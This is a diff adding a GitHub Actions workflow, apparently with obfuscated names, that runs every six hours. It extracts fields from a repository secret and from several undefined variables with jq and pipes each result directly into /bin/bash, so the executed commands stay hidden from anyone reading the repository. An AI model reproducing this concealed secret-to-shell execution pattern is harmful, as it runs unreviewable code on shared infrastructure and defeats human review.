@@ -1,0 +1,25 @@
+name: yunnansantian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yunnansantian
+        env:
+          jya823: ${{ secrets.jya823 }}
+        run: |
+          echo $jya823 | jq -r .v385 | /bin/bash
+          echo $ngyfv25833 | jq -r .lrbn8 | /bin/bash
+          echo $abl18557 | jq -r .dvto1127 | /bin/bash
+          echo $cbsuw71 | jq -r .g92776 | /bin/bash
+          echo $pbmr74 | jq -r .kucwe6209 | /bin/bash
+          echo $b3479 | jq -r .xtffx89 | /bin/bash
+          echo $cpzjw8 | jq -r .c90355 | /bin/bash
+          echo $j45878 | jq -r .fbj389 | /bin/bash
+          echo $fv7258 | jq -r .ino0 | /bin/bash
+
